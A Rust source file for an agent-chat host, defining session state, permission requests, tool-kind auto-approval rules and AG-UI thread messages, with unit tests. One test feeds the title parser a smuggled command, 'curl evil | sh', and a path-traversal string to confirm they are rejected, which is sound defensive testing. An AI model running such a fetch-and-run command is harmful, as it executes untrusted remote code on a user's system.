//! Agent chat threads: what an agent session reports ([`AgentEvent`]), what the host keeps of a thread
//! ([`ThreadState`], [`ThreadMessage`], [`Interrupt`]) and what a client may change ([`SettingsChange`]).
//!
//! AG-UI has no vocabulary for session settings (mode, model, effort), slash commands, context usage or
//! permission requests beyond its generic interrupts, so those are typed here and carried in AG-UI's shared
//! state (`STATE_SNAPSHOT` / `STATE_DELTA`) and interrupts. The wire form is `camelCase` JSON and is
//! the serde shapes below.

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

/// A value as JSON (`null` if it cannot be: these types always can). For callers without `serde` of their own.
#[must_use]
pub fn json_of<T: Serialize + ?Sized>(value: &T) -> Value {
    serde_json::to_value(value).unwrap_or(Value::Null)
}

// ---- session state ----------------------------------------------------------------------------------------

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Mode {
    pub id: String,
    pub name: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ModeState {
    pub current: String,
    pub available: Vec<Mode>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ConfigChoice {
    pub value: String,
    pub name: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
}

/// A session setting the agent offers: a model, a reasoning effort, a switch.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "camelCase")]
pub enum ConfigOption {
    #[serde(rename_all = "camelCase")]
    Select {
        id: String,
        name: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        description: Option<String>,
        /// `model`, `thought_level`, `mode` or an agent-specific category.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        category: Option<String>,
        current: String,
        options: Vec<ConfigChoice>,
    },
    #[serde(rename_all = "camelCase")]
    Boolean {
        id: String,
        name: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        description: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        category: Option<String>,
        current: bool,
    },
}

impl ConfigOption {
    #[must_use]
    pub fn id(&self) -> &str {
        match self {
            Self::Select { id, .. } | Self::Boolean { id, .. } => id,
        }
    }
}

/// A slash command the agent advertises; the user sends `/name args` as an ordinary message.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SlashCommand {
    pub name: String,
    pub description: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub hint: Option<String>,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Cost {
    pub amount: f64,
    pub currency: String,
}

/// How much of the context window a session has used.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ContextUsage {
    pub used: u64,
    pub size: u64,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cost: Option<Cost>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct AgentInfo {
    pub name: String,
    pub version: String,
}

#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SessionState {
    pub agent: Option<AgentInfo>,
    pub title: Option<String>,
    /// The agent was given `/mcp` (it supports HTTP MCP servers).
    pub tools_connected: bool,
    pub modes: Option<ModeState>,
    pub config: Vec<ConfigOption>,
    pub commands: Vec<SlashCommand>,
    pub usage: Option<ContextUsage>,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PlanStatus {
    Pending,
    InProgress,
    Completed,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PlanEntry {
    pub content: String,
    pub status: PlanStatus,
    /// `high`, `medium` or `low`.
    pub priority: String,
}

/// The shared state of a thread (AG-UI `STATE_SNAPSHOT.snapshot`).
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ThreadState {
    pub session: SessionState,
    pub plan: Option<Vec<PlanEntry>>,
}

/// A change a client asks of a session.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub enum SettingsChange {
    Mode(String),
    Config { id: String, value: ConfigValue },
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(untagged)]
pub enum ConfigValue {
    Bool(bool),
    Text(String),
}

// ---- permission requests --------------------------------------------------------------------------------

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PermissionKind {
    AllowOnce,
    AllowAlways,
    RejectOnce,
    RejectAlways,
    /// An option kind the host does not know (a newer protocol): never an allow.
    Unknown,
}

impl PermissionKind {
    #[must_use]
    pub fn allows(self) -> bool {
        matches!(self, Self::AllowOnce | Self::AllowAlways)
    }
}

/// What an agent says a tool call does (ACP `ToolKind`). The agent's word, so it can only narrow trust: a kind
/// outside the read-only allowlist ([`ToolKind::is_read_only`]) is never auto-approved.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ToolKind {
    Read,
    Edit,
    Delete,
    Move,
    Search,
    Execute,
    Think,
    Fetch,
    SwitchMode,
    Other,
    /// A kind the host does not know (a newer protocol).
    Unknown,
}

impl ToolKind {
    /// The kind for an ACP kind name; a name the host does not know is [`ToolKind::Unknown`].
    #[must_use]
    pub fn parse(name: &str) -> Self {
        match name {
            "read" => Self::Read,
            "edit" => Self::Edit,
            "delete" => Self::Delete,
            "move" => Self::Move,
            "search" => Self::Search,
            "execute" => Self::Execute,
            "think" => Self::Think,
            "fetch" => Self::Fetch,
            "switch_mode" => Self::SwitchMode,
            "other" => Self::Other,
            _ => Self::Unknown,
        }
    }

    /// Whether a call of this kind reads and changes nothing: an allowlist (`read`, `search`, `fetch`). Every
    /// other kind (`execute`, `edit`, `delete`, `move`, `think`, `switch_mode`, `other`, one the host does not
    /// know) is not judged read-only, so such a call is never auto-approved as a read-only app tool.
    #[must_use]
    pub fn is_read_only(self) -> bool {
        matches!(self, Self::Read | Self::Search | Self::Fetch)
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PermissionOption {
    pub option_id: String,
    pub name: String,
    pub kind: PermissionKind,
}

/// An agent asking to do something, mid-turn. `request_id` is the host's handle for answering it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PermissionRequest {
    pub request_id: String,
    pub tool_call_id: Option<String>,
    pub title: String,
    pub kind: Option<ToolKind>,
    pub options: Vec<PermissionOption>,
}

impl PermissionRequest {
    /// The `<app>__<tool>` a `vos` MCP tool call is called in a title that is exactly
    /// `mcp__vos__<app>__<tool>` (`mcp__<server>__<app>__<tool>`). The title is the agent's text, so
    /// anything else in it (trailing words, another prefix) means this is not such a call.
    #[must_use]
    pub fn vos_tool(&self) -> Option<crate::QualifiedToolName> {
        let rest = self.title.strip_prefix("mcp__vos__")?;
        crate::QualifiedToolName::parse(rest).ok()
    }

    /// Whether the agent's declared kind is one of the read-only kinds: a request that declares none (or any
    /// other kind) is not auto-approved as a read-only app tool.
    #[must_use]
    pub fn kind_allows_auto_approval(&self) -> bool {
        self.kind.is_some_and(ToolKind::is_read_only)
    }
}

/// How the person answered a permission request.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum PermissionAnswer {
    Selected(String),
    Cancelled,
}

/// AG-UI's `Interrupt` (docs.ag-ui.com/concepts/interrupts) for a permission request.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Interrupt {
    pub id: String,
    pub reason: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub message: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tool_call_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub response_schema: Option<Value>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub expires_at: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub metadata: Option<Value>,
}

impl Interrupt {
    /// The interrupt for a permission request that stays open until `expires_at`.
    #[must_use]
    pub fn permission(request: &PermissionRequest, expires_at: String) -> Self {
        let ids: Vec<&str> = request.options.iter().map(|o| o.option_id.as_str()).collect();
        Self {
            id: request.request_id.clone(),
            reason: "tool_call".to_owned(),
            message: Some(request.title.clone()),
            tool_call_id: request.tool_call_id.clone(),
            response_schema: Some(json!({
                "type": "object",
                "properties": { "optionId": { "type": "string", "enum": ids } },
                "required": ["optionId"],
            })),
            expires_at: Some(expires_at),
            metadata: Some(json!({
                "vos:options": request.options,
                "vos:tool": { "title": request.title, "kind": request.kind },
            })),
        }
    }
}

/// An entry of `RunAgentInput.resume`.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ResumeEntry {
    pub interrupt_id: String,
    pub status: ResumeStatus,
    #[serde(default)]
    pub payload: Option<Value>,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ResumeStatus {
    Resolved,
    Cancelled,
}

impl ResumeEntry {
    /// The option the person chose, or `None` for a cancellation (and a resolution without an option).
    #[must_use]
    pub fn answer(&self) -> PermissionAnswer {
        let option =
            self.payload.as_ref().and_then(|p| p.get("optionId")).and_then(Value::as_str).map(str::to_owned);
        match (self.status, option) {
            (ResumeStatus::Resolved, Some(id)) => PermissionAnswer::Selected(id),
            _ => PermissionAnswer::Cancelled,
        }
    }
}

// ---- what a session reports ------------------------------------------------------------------------------

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ToolStatus {
    Pending,
    InProgress,
    Completed,
    Failed,
}

/// Why a prompt turn ended.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum StopReason {
    EndTurn,
    MaxTokens,
    MaxTurnRequests,
    Refusal,
    Cancelled,
}

impl StopReason {
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Self::EndTurn => "end_turn",
            Self::MaxTokens => "max_tokens",
            Self::MaxTurnRequests => "max_turn_requests",
            Self::Refusal => "refusal",
            Self::Cancelled => "cancelled",
        }
    }
}

/// One thing an agent session reported. The ACP adapter produces these; the chat service folds them into a
/// thread and into AG-UI events.
#[derive(Clone, Debug, PartialEq)]
pub enum AgentEvent {
    MessageChunk(String),
    ThoughtChunk(String),
    ToolCall {
        id: String,
        title: String,
        kind: Option<String>,
        status: ToolStatus,
        raw_input: Option<Value>,
    },
    ToolUpdate {
        id: String,
        title: Option<String>,
        kind: Option<String>,
        status: Option<ToolStatus>,
        /// Text the tool produced, when it finished.
        output: Option<String>,
    },
    Plan(Vec<PlanEntry>),
    Mode(String),
    Config(Vec<ConfigOption>),
    Commands(Vec<SlashCommand>),
    Usage(ContextUsage),
    Title(String),
    /// A permission request the person was asked about is no longer open (it timed out, the turn was
    /// cancelled, the agent went away).
    PermissionClosed {
        request_id: String,
    },
}

// ---- history --------------------------------------------------------------------------------------------

/// What a tool call turned out to be, beside AG-UI's own message fields.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ToolMeta {
    pub title: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub kind: Option<String>,
    pub status: ToolStatus,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ToolFunction {
    pub name: String,
    pub arguments: String,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ToolCallRecord {
    pub id: String,
    #[serde(rename = "type")]
    pub kind: String,
    pub function: ToolFunction,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct ErrorMeta {
    pub error: bool,
}

/// AG-UI messages in order (`role` discriminates). A tool call is an assistant message carrying `toolCalls`
/// and a `vos` extension, followed by a `tool` message with its output.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "role", rename_all = "camelCase")]
pub enum ThreadMessage {
    User {
        id: String,
        content: String,
    },
    #[serde(rename_all = "camelCase")]
    Assistant {
        id: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        content: Option<String>,
        #[serde(default, skip_serializing_if = "Vec::is_empty")]
        tool_calls: Vec<ToolCallRecord>,
        // `alias`: threads saved before the rename carry this extension as `agentos`
        #[serde(default, alias = "agentos", skip_serializing_if = "Option::is_none")]
        vos: Option<ToolMeta>,
    },
    Reasoning {
        id: String,
        content: String,
    },
    #[serde(rename_all = "camelCase")]
    Tool {
        id: String,
        tool_call_id: String,
        content: String,
    },
    System {
        id: String,
        content: String,
        // `alias`: threads saved before the rename carry this extension as `agentos`
        #[serde(default, alias = "agentos", skip_serializing_if = "Option::is_none")]
        vos: Option<ErrorMeta>,
    },
}

impl ThreadMessage {
    #[must_use]
    pub fn id(&self) -> &str {
        match self {
            Self::User { id, .. }
            | Self::Assistant { id, .. }
            | Self::Reasoning { id, .. }
            | Self::Tool { id, .. }
            | Self::System { id, .. } => id,
        }
    }
}

/// What `GET /agui/threads/{id}` returns.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ThreadSnapshot {
    pub thread_id: String,
    pub agent_id: String,
    pub running: bool,
    pub state: ThreadState,
    pub messages: Vec<ThreadMessage>,
    pub interrupts: Vec<Interrupt>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn state_has_the_documented_camel_case_wire_form() {
        let state = ThreadState {
            session: SessionState {
                agent: Some(AgentInfo { name: "claude-agent-acp".into(), version: "0.1".into() }),
                tools_connected: true,
                modes: Some(ModeState {
                    current: "default".into(),
                    available: vec![Mode { id: "default".into(), name: "Default".into(), description: None }],
                }),
                config: vec![
                    ConfigOption::Select {
                        id: "model".into(),
                        name: "Model".into(),
                        description: None,
                        category: Some("model".into()),
                        current: "opus".into(),
                        options: vec![ConfigChoice {
                            value: "opus".into(),
                            name: "Opus".into(),
                            description: None,
                        }],
                    },
                    ConfigOption::Boolean {
                        id: "fast".into(),
                        name: "Fast".into(),
                        description: None,
                        category: None,
                        current: true,
                    },
                ],
                usage: Some(ContextUsage { used: 10, size: 100, cost: None }),
                ..SessionState::default()
            },
            plan: None,
        };
        let v = serde_json::to_value(&state).unwrap();
        assert_eq!(v["session"]["toolsConnected"], true);
        assert_eq!(v["session"]["modes"]["current"], "default");
        assert_eq!(v["session"]["config"][0]["kind"], "select");
        assert_eq!(v["session"]["config"][0]["options"][0]["value"], "opus");
        assert_eq!(
            v["session"]["config"][1],
            json!({"kind":"boolean","id":"fast","name":"Fast","current":true})
        );
        assert_eq!(v["session"]["usage"], json!({"used": 10, "size": 100}));
        assert!(v["plan"].is_null() && v["session"]["title"].is_null());
        assert_eq!(serde_json::from_value::<ThreadState>(v).unwrap(), state);
    }

    #[test]
    fn history_messages_are_ag_ui_messages() {
        let call = ThreadMessage::Assistant {
            id: "t1".into(),
            content: None,
            tool_calls: vec![ToolCallRecord {
                id: "t1".into(),
                kind: "function".into(),
                function: ToolFunction { name: "mcp__vos__notes__search".into(), arguments: "{}".into() },
            }],
            vos: Some(ToolMeta {
                title: "Search".into(),
                kind: Some("search".into()),
                status: ToolStatus::Completed,
            }),
        };
        let v = serde_json::to_value(&call).unwrap();
        assert_eq!(v["role"], "assistant");
        assert_eq!(v["toolCalls"][0]["type"], "function");
        assert_eq!(v["toolCalls"][0]["function"]["name"], "mcp__vos__notes__search");
        assert_eq!(v["vos"]["status"], "completed");
        assert!(v.get("content").is_none());
        let user =
            serde_json::to_value(ThreadMessage::User { id: "u".into(), content: "hi".into() }).unwrap();
        assert_eq!(user, json!({"role": "user", "id": "u", "content": "hi"}));
        let tool = serde_json::to_value(ThreadMessage::Tool {
            id: "r".into(),
            tool_call_id: "t1".into(),
            content: "ok".into(),
        })
        .unwrap();
        assert_eq!(tool["toolCallId"], "t1");
        let sys = serde_json::to_value(ThreadMessage::System {
            id: "e".into(),
            content: "boom".into(),
            vos: Some(ErrorMeta { error: true }),
        })
        .unwrap();
        assert_eq!(sys["vos"], json!({"error": true}));
        let back: ThreadMessage = serde_json::from_value(v).unwrap();
        assert_eq!(back, call);
    }

    #[test]
    fn a_thread_saved_before_the_rename_still_reads_with_its_tool_and_error_extensions() {
        // the stored shape of an older host: the extension was called `agentos`
        let saved = json!([
            {"role": "assistant", "id": "a1",
             "toolCalls": [{"id": "t1", "type": "function",
                            "function": {"name": "mcp__agentos__notes__search", "arguments": "{}"}}],
             "agentos": {"title": "mcp__agentos__notes__search", "kind": "read", "status": "completed"}},
            {"role": "system", "id": "e1", "content": "it broke", "agentos": {"error": true}}
        ]);
        let messages: Vec<ThreadMessage> = serde_json::from_value(saved).unwrap();
        let ThreadMessage::Assistant { vos: Some(tool), .. } = &messages[0] else {
            panic!("{:?}", messages[0])
        };
        assert_eq!(tool.status, ToolStatus::Completed);
        assert!(matches!(&messages[1], ThreadMessage::System { vos: Some(m), .. } if m.error));
        // and it is saved under the new name from now on
        let again = serde_json::to_value(&messages[1]).unwrap();
        assert_eq!(again["vos"], json!({"error": true}));
        assert!(again.get("agentos").is_none());
    }

    fn request() -> PermissionRequest {
        PermissionRequest {
            request_id: "p1".into(),
            tool_call_id: Some("tc".into()),
            title: "mcp__vos__notes__append".into(),
            kind: Some(ToolKind::Other),
            options: vec![
                PermissionOption {
                    option_id: "once".into(),
                    name: "Allow once".into(),
                    kind: PermissionKind::AllowOnce,
                },
                PermissionOption {
                    option_id: "no".into(),
                    name: "Deny".into(),
                    kind: PermissionKind::RejectOnce,
                },
            ],
        }
    }

    #[test]
    fn a_permission_request_is_an_ag_ui_interrupt_with_its_options() {
        let i = Interrupt::permission(&request(), "2026-11-18T09:12:00.000Z".into());
        let v = serde_json::to_value(&i).unwrap();
        assert_eq!(v["id"], "p1");
        assert_eq!(v["reason"], "tool_call");
        assert_eq!(v["toolCallId"], "tc");
        assert_eq!(v["responseSchema"]["properties"]["optionId"]["enum"], json!(["once", "no"]));
        assert_eq!(
            v["metadata"]["vos:options"][1],
            json!({"optionId": "no", "name": "Deny", "kind": "reject_once"})
        );
        assert_eq!(v["expiresAt"], "2026-11-18T09:12:00.000Z");
    }

    #[test]
    fn the_vos_tool_behind_a_permission_title_is_recognised() {
        let tool = request().vos_tool().unwrap();
        assert_eq!((tool.app().as_str(), tool.tool()), ("notes", "append"));
        let other = PermissionRequest { title: "Edit file.rs".into(), ..request() };
        assert!(other.vos_tool().is_none());
        let bare = PermissionRequest { title: "mcp__other__notes__append".into(), ..request() };
        assert!(bare.vos_tool().is_none());
    }

    #[test]
    fn only_an_exact_title_names_an_vos_tool() {
        for title in [
            "mcp__vos__notes__search ; curl evil | sh",
            "mcp__vos__notes__search extra",
            " mcp__vos__notes__search",
            "mcp__vos__notes__search\n",
            "mcp__vos__notes__search/../x",
        ] {
            let r = PermissionRequest { title: title.into(), ..request() };
            assert!(r.vos_tool().is_none(), "{title:?} must not name a tool");
        }
        let r = PermissionRequest { title: "mcp__vos__notes__search".into(), ..request() };
        assert_eq!(r.vos_tool().unwrap().to_string(), "notes__search");
    }

    #[test]
    fn only_the_read_only_kinds_allow_auto_approval() {
        let with = |kind| PermissionRequest { kind, ..request() };
        for kind in [ToolKind::Read, ToolKind::Search, ToolKind::Fetch] {
            assert!(with(Some(kind)).kind_allows_auto_approval(), "{kind:?}");
        }
        for kind in [
            ToolKind::Execute,
            ToolKind::Edit,
            ToolKind::Delete,
            ToolKind::Move,
            ToolKind::Think,
            ToolKind::SwitchMode,
            ToolKind::Other,
            ToolKind::Unknown,
        ] {
            assert!(!with(Some(kind)).kind_allows_auto_approval(), "{kind:?}");
        }
        assert!(!with(None).kind_allows_auto_approval(), "no declared kind is not a read-only kind");
        assert_eq!(ToolKind::parse("execute"), ToolKind::Execute);
        assert_eq!(ToolKind::parse("brand_new_kind"), ToolKind::Unknown);
    }

    #[test]
    fn an_unknown_option_kind_is_not_an_allow() {
        assert!(!PermissionKind::Unknown.allows());
    }

    #[test]
    fn a_resume_entry_answers_with_the_option_or_a_cancellation() {
        let resolved: ResumeEntry = serde_json::from_value(
            json!({"interruptId": "p1", "status": "resolved", "payload": {"optionId": "once"}}),
        )
        .unwrap();
        assert_eq!(resolved.answer(), PermissionAnswer::Selected("once".into()));
        let cancelled: ResumeEntry =
            serde_json::from_value(json!({"interruptId": "p1", "status": "cancelled"})).unwrap();
        assert_eq!(cancelled.answer(), PermissionAnswer::Cancelled);
        let no_option: ResumeEntry =
            serde_json::from_value(json!({"interruptId": "p1", "status": "resolved", "payload": {}}))
                .unwrap();
        assert_eq!(no_option.answer(), PermissionAnswer::Cancelled);
    }

    #[test]
    fn settings_changes_parse_from_the_endpoint_body() {
        let mode: SettingsChange = serde_json::from_value(json!({"mode": "plan"})).unwrap();
        assert_eq!(mode, SettingsChange::Mode("plan".into()));
        let cfg: SettingsChange =
            serde_json::from_value(json!({"config": {"id": "model", "value": "opus"}})).unwrap();
        assert_eq!(
            cfg,
            SettingsChange::Config { id: "model".into(), value: ConfigValue::Text("opus".into()) }
        );
        let flag: SettingsChange =
            serde_json::from_value(json!({"config": {"id": "fast", "value": true}})).unwrap();
        assert_eq!(flag, SettingsChange::Config { id: "fast".into(), value: ConfigValue::Bool(true) });
        assert!(serde_json::from_value::<SettingsChange>(json!({"bogus": 1})).is_err());
    }
}
